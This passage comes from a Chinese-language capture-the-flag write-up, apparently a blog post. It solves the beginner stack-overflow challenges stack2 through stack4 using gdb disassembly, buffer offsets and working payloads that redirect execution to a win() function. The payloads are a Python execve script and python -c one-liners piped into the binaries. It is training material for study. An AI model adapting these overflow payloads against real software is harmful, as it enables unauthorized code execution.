&lt;strcpy@plt&gt;;if (modified = 0x8048618)?0x080484e4 &lt;main+80&gt;: mov eax,DWORD PTR [esp+0x58]0x080484e8 &lt;main+84&gt;: cmp eax,0xd0a0d0a0x080484ed &lt;main+89&gt;: jne 0x80484fd &lt;main+105&gt;;puts($0x8048618) and leave if (modified == 0xd0a0d0a)0x080484ef &lt;main+91&gt;: mov DWORD PTR [esp],0x80486180x080484f6 &lt;main+98&gt;: call 0x80483cc &lt;puts@plt&gt;0x080484fb &lt;main+103&gt;: jmp 0x8048512 &lt;main+126&gt;;printf($0x8048641, midified) if (modified != 0xd0a0d0a)0x080484fd &lt;main+105&gt;: mov edx,DWORD PTR [esp+0x58]0x08048501 &lt;main+109&gt;: mov eax,0x80486410x08048506 &lt;main+114&gt;: mov DWORD PTR [esp+0x4],edx0x0804850a &lt;main+118&gt;: mov DWORD PTR [esp],eax0x0804850d &lt;main+121&gt;: call 0x80483ac &lt;printf@plt&gt;0x08048512 &lt;main+126&gt;: leave 0x08048513 &lt;main+127&gt;: ret End of assembler dump. ​ 各个字符串的值分别如下: 123450x80485e0: &quot;GREENIE&quot;(gdb) x/s0x80485e8: &quot;please set the GREENIE environment variable\n&quot;(gdb) x/s 0x80486180x8048618: &quot;you have correctly modified the variable&quot; ​ 整个程序的流程就是调用strcpy将env_greenie的值复制给buf, 如果midified的值被覆盖, 则输出”you have correctly modified the variable”, 否则视为失败. ​ stack2的源码在Here. solve.py​ 下面是用python写的exp, 由于小端的存取顺序0x0d0a0d0a需要倒过来写: 1234import osenv_greenie = 'A'*0x40 + '\x0a\x0d\x0a\x0d'envp = &#123;"GREENIE": str(env_greenie)&#125;os.execve("./stack2", ["./stack2"], envp) stack3还是先上汇编代码, 下面这段是main函数的汇编代码: 123456789101112131415161718192021222324252627282930(gdb) disas mainDump of assembler code for function main:;midified = [esp+0x5c];buf = [esp+0x1c]0x08048438 &lt;main+0&gt;: push ebp0x08048439 &lt;main+1&gt;: mov ebp,esp0x0804843b &lt;main+3&gt;: and esp,0xfffffff00x0804843e &lt;main+6&gt;: sub esp,0x600x08048441 &lt;main+9&gt;: mov DWORD PTR [esp+0x5c],0x0 ;midified = 0;gets(buf)0x08048449 &lt;main+17&gt;: lea eax,[esp+0x1c]0x0804844d &lt;main+21&gt;: mov DWORD PTR [esp],eax0x08048450 &lt;main+24&gt;: call 0x8048330 &lt;gets@plt&gt;;if (modified == 0)?0x08048455 &lt;main+29&gt;: cmp DWORD PTR [esp+0x5c],0x0;leave if if (modified == 0)0x0804845a &lt;main+34&gt;: je 0x8048477 &lt;main+63&gt;;if (modified != 0)&#123;;printf($0x8048560, midified)0x0804845c &lt;main+36&gt;: mov eax,0x80485600x08048461 &lt;main+41&gt;: mov edx,DWORD PTR [esp+0x5c]0x08048465 &lt;main+45&gt;: mov DWORD PTR [esp+0x4],edx0x08048469 &lt;main+49&gt;: mov DWORD PTR [esp],eax0x0804846c &lt;main+52&gt;: call 0x8048350 &lt;printf@plt&gt;;call(modified) &#125;0x08048471 &lt;main+57&gt;: mov eax,DWORD PTR [esp+0x5c]0x08048475 &lt;main+61&gt;: call eax0x08048477 &lt;main+63&gt;: leave 0x08048478 &lt;main+64&gt;: ret End of assembler dump. 字符串的值如下: 12(gdb) x/s 0x80485600x8048560: &quot;calling function pointer, jumping to 0x%08x\n&quot; 可以看到, 若modified被覆盖, 函数将跳转midified, 我们只要把modified覆盖成我们想要跳转的地址即可. 查看程序的C源码, 可以看到源码中定义了一个win()函数. 12(gdb) info addr winSymbol &quot;win&quot; is a function at address 0x8048424. 所以0x8048424就是我们要跳转的地址. stack2的源码在Here. solve1python -c "print 'A'*0x40 + '\x24\x84\x04\x08'" | ./stack3 stack4这道题的代码有点短, 代码如下: 12345678910111213Dump of assembler code for function main:;buf = [esp+0x10] ;size = 0x400x08048408 &lt;main+0&gt;: push ebp0x08048409 &lt;main+1&gt;: mov ebp,esp0x0804840b &lt;main+3&gt;: and esp,0xfffffff00x0804840e &lt;main+6&gt;: sub esp,0x50;gets(buf)0x08048411 &lt;main+9&gt;: lea eax,[esp+0x10]0x08048415 &lt;main+13&gt;: mov DWORD PTR [esp],eax0x08048418 &lt;main+16&gt;: call 0x804830c &lt;gets@plt&gt;0x0804841d &lt;main+21&gt;: leave 0x0804841e &lt;main+22&gt;: ret End of assembler dump. 该程序调用gets函数读取用户输入, 然后退出. 我们可以覆写函数的返回地址, 让函数返回到win函数的入口地址. 用gdb查看win函数的地址为0x80483f4, 调试程序, 查看buf的地址离要覆盖的地址之间的偏移. buf的起始地址在$esp+0x10 == 0xbffffc50. retaddr的地址为$ebp+0x4 == 0xbffffc9c, 偏移为0x4c. 1234(gdb) x/x $esp+0x100xbffffc50: 0xb7fd7ff4(gdb) x/x $ebp+0x40xbffffc9c: 0xb7eadc76 solve1python -c "print 'A'*0x4c + '\xf4\x83\x04\x08'" | ./stack4 运行上面这行命令以后, 我们会得到”code flow successfully changed”的输出和一个Segmentation fault的提示, 这是正常的, 因为我们覆盖了main函数的返回地址使得程序无法正常退出了. summary以上的五道题目都是非常简单的栈溢出题, 程序没有设置任何保护机制, 也不需要用到什么技巧就能够破解. 有一点要注明的是, 上面的代码块中有些语法为shell的代码块我写了python, 因为Hexo默认不支持shell, 也不支持汇编…]]></content>
      <categories>
        <category>write-up</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>stack overflow</tag>
      </tags>
  </entry>
</search>
